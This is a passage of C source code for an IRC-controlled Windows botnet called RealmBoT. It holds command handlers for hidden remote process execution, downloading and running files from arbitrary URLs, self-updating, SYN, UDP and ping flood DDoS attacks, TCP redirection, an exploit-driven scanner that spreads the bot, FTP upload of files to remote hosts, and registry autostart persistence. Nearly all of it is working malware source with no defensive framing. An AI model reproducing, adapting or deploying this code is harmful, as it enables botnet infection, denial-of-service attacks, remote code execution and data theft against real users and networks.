					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", y);
						addlogv("RealmBoT (clones.p.l.g) .»».  Raw (%s): %s", a[s+1], y);
					}

				}

				return repeat;
			}
			else if (strcmp("clone.mode", a[s]) == 0 || strcmp("clone.m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL)
						sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
						addlogv("RealmBoT (clones.p.l.g) .»».  Mode (%s): %s", a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("clone.nick", a[s]) == 0 || strcmp("clone.ni", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
					addlogv("RealmBoT (clones.p.l.g) .»».  Nick (%s): %s", a[s+1], a[s+2]);
				}

				return repeat;
			}
			else if (strcmp("clone.join", a[s]) == 0 || strcmp("clone.j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS)
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("clone.part", a[s]) == 0 || strcmp("clone.p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS)
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("irc.repeat", a[s]) == 0 || strcmp("irc.rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Repeat: %s", r);
						addlog(sendbuf);

						if (atoi(a[s+1]) > 0)
							return repeat + atoi(a[s+1]);
						else
							return repeat;
					} else {
						sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Repeat not allowed in command line: %s", r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("irc.de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0)
						Sleep(atoi(a[s+1])*1000);
					addlog("RealmBoT (irc.p.l.g) .»».  Delay.");
					return repeat + 1;
				}

				return 1;
			}

			#ifndef NO_DOWNLOAD
			else if ((strcmp("update", a[s]) == 0) || (strcmp("", a[s]) == 0)) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "[REALMBOT] << Downloading update from: %s >>", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[REALMBOT] << Failed to start download thread, error: <%d> >>", GetLastError());
				} else
					sprintf(sendbuf,"[REALMBOT] : Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif

			else if (strcmp("execute", a[s]) == 0 || strcmp("com.e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL)
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"RealmBoT (exec.p.l.g) .»».  Couldn't execute file.");
						else
							sprintf(sendbuf,"RealmBoT (exec.p.l.g) .»».  Commands: %s",y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			
			else if (strcmp("rename", a[s]) == 0 || strcmp("com.mv", a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT(file.p.l.g) .»».  Rename: '%s' to: '%s'.", a[s+1], a[s+2]);
				else
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("RealmBoT (file.p.l.g) .»». "));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone.make", a[s]) == 0 || strcmp("clone.start", a[s]) == 0) {
				IRC irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4])
					strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				irc.spy = 1;

				sprintf(sendbuf, "[REALMBOT] << Created clones on %s:%d, in channel %s >>", irc.host, irc.port, irc.channel);
				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				if (threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (LPVOID)&irc, 0, &id)) {
					while(irc.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[REALMBOT] << Failed to start clone thread, error: <%d> >>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_DDOS
			else if (strcmp("synflood", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[REALMBOT-SYN] << Attacking: (%s:%s) for %s seconds >>", a[s+1], a[s+2], a[s+3]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"RealmBoT (ddos.p.l.g) .»».  Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif

			
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "[REALMBOT] << Downloading URL: %s to: %s >>", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"RealmBoT (download.p.l.g) .»».  Failed to start transfer thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("daemon.rd", a[s]) == 0) {
				REDIRECT redirect;
				redirect.lport = atoi(a[s+1]);
				strncpy(redirect.dest,  a[s+2], sizeof(redirect.dest)-1);
				redirect.port = atoi(a[s+3]);
				redirect.sock = sock;
				_snprintf(redirect.chan,sizeof(redirect.chan),a[2]);
				redirect.notice = notice;
				redirect.silent = silent;

				sprintf(sendbuf, "RealmBoT (redirect.p.l.g) .»».   TCP redirect created from: %s:%d to: %s:%d.", GetIP(sock), redirect.lport, redirect.dest, redirect.port);
				redirect.threadnum = addthread(sendbuf,REDIRECT_THREAD,NULL);
				if (threads[redirect.threadnum].tHandle = CreateThread(NULL, 0, &RedirectThread, (LPVOID)&redirect, 0, &id)) {
					while(redirect.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"RealmBoT (redirect.p.l.g) .»».   Failed to start redirection thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			
			else if (strcmp("clone.privmsg", a[s]) == 0 || strcmp("clone.pm", a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], y, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			else if (strcmp("clone.action", a[s]) == 0 || strcmp("clone.ac", a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], sendbuf, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp("advscan", a[s]) == 0 || strcmp("asc", a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"[REALMBOT] << Already %d scanning threads. Too many specified >>", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "[REALMBOT] : Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);

								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "[REALMOT] Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "[REALMBOT]  %s Exploitation started on %s:%d waiting %d seconds for %d minutes using %d threads.",
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[REALMBOT] Failed to start scan thread, error: <%d>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif

			#ifndef NO_UDP
			else if (strcmp("udpflood", a[s]) == 0 || strcmp("ddos.udpf", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				PINGFLOOD udps;
				udps.silent = silent;
				udps.notice = notice;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL)
					udps.port = atoi(a[s+5]);
				else
					udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;

				sprintf(sendbuf, "[REALMBOT-UDPFLOOD] << Sending %d packets to: %s. Packet size: %d, Delay: %d(ms) >>", udps.num, udps.host, udps.size, udps.delay);
				udps.threadnum = addthread(sendbuf,UDP_THREAD,NULL);
				if (threads[udps.threadnum].tHandle = CreateThread(NULL, 0, &udp, (LPVOID)&udps, 0, &id)) {
					while(udps.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[REALMBOT] << Failed to start flood thread, error: <%d> >>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("pingflood", a[s]) == 0 || strcmp("ddos.pingf", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					PINGFLOOD pings;
					pings.silent = silent;
					pings.notice = notice;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;

					sprintf(sendbuf, "[REALMBOT-PING] : Sending %d pings to %s. packet size: %d, timeout: %d(ms).", pings.num, pings.host, pings.size, pings.delay);
					pings.threadnum = addthread(sendbuf,PING_THREAD,NULL);
					if (threads[pings.threadnum].tHandle = CreateThread(NULL, 0, &ping, (LPVOID)&pings, 0, &id)) {
						while(pings.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[REALMBOT-PING] : Failed to start flood thread, error: <%d>.", GetLastError());
				} else
					strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			
			#ifndef NO_HTTP
			else if (strcmp("httpcon",a[s]) == 0 || strcmp("util.hcon",a[s]) == 0) {
				HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
			#endif

			// commands requiring at least 5 parameters
		    else if (a[s+5] == NULL) return 1;
			else if (strcmp("ftp.upload",a[s]) == 0) {
				if (!FileExists(a[s+5])) {
					sprintf(sendbuf,"RealmBoT (ftp.p.l.g) .»».  File not found: %s.", a[s+5]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
					return 1;
				}
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH];

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9);

				FILE * fp = fopen(tmpftp,"ab");
				if (fp != NULL) {
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]);
					fclose(fp);

					char cmdline[256];
					sprintf(cmdline,"-s:%s",tmpftp);
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("RealmBoT (ftp.p.l.g) .»».  Uploading file: %s to: %s",a[s+5],a[s+1]);
					else
						sprintf("RealmBoT (ftp.p.l.g) .»».  Uploading file: %s to: %s failed.",a[s+5],a[s+1]);

					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);

					while (FileExists(tmpftp))
						remove(tmpftp);
				}

				return 1;
			}
		}
	}

	return repeat;
}


// globals
#ifdef DEBUG_LOGGING
FILE *gfp;
#endif

char log[LOGSIZE][LOGLINE];

int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Alias List]-", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--)
		if (log[i][0] != '\0')
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void addlogv(char *desc, ...)
{
	char logbuf[LOGLINE];

	va_list argp;
	va_start(argp, desc);
	_vsnprintf(logbuf, sizeof(logbuf), desc, argp);

	addlog(logbuf);

	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++)
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}

	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "RealmBoT (logs.p.l.g) .»».   Cleared.", notice);
	addlog("RealmBoT (logs.p.l.g) .»».   Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++)
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}

	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param)
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"RealmBoT (log.p.l.g) .»».  Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++)
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}

	sprintf(sendbuf,"RealmBoT (log.p.l.g) .»».  List complete.");
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif


#ifndef NO_REGISTRY
int registry_delay=120;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey3}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename);
		fRegCloseKey(key);
	}

	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"RealmBoT (download.p.l.g) .»».  Couldn't open file: %s.",dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			addlog(buffer);

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);

			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r)
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen)
				if (total>dl.filelen)
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1)
				sprintf(threads[dl.threadnum].name, "RealmBoT (download.p.l.g) .»».  File download: %s (%dKB transferred).", dl.url, total / 1024);
			else
				sprintf(threads[dl.threadnum].name, "RealmBoT (download.p.l.g) .»».  Update: %s (%dKB transferred).", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"RealmBoT (download.p.l.g) .»».  Filesize is incorrect: (%d != %d).", total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				addlog(buffer);
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		
		free(fileTotBuff);

		if (dl.expectedcrc) {
			unsigned long crc=crc32f(dl.dest);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				sprintf(buffer,"RealmBoT (download.p.l.g) .»».  CRC Failed (%d != %d).", crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}

		if (goodfile==FALSE)
			goto badfile;

		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "RealmBoT (download.p.l.g) .»».  Downloaded %.1f KB to %s @ %.1f KB/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"RealmBoT (download.p.l.g) .»».  Opened: %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
					addlog(buffer);
				}
			}

		// download is an update
		} else {
			sprintf(buffer, "RealmBoT (download.p.l.g) .»».  Downloaded %.1fKB to %s @ %.1fKB/sec. Updating.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"RealmBoT (download.p.l.g) .»».  Update failed: Error executing file: %s.",dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}
	} else {
		sprintf(buffer,"RealmBoT (download.p.l.g) .»».  Bad URL, or DNS Error: %s.",dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		addlog(buffer);
	}

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif
#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
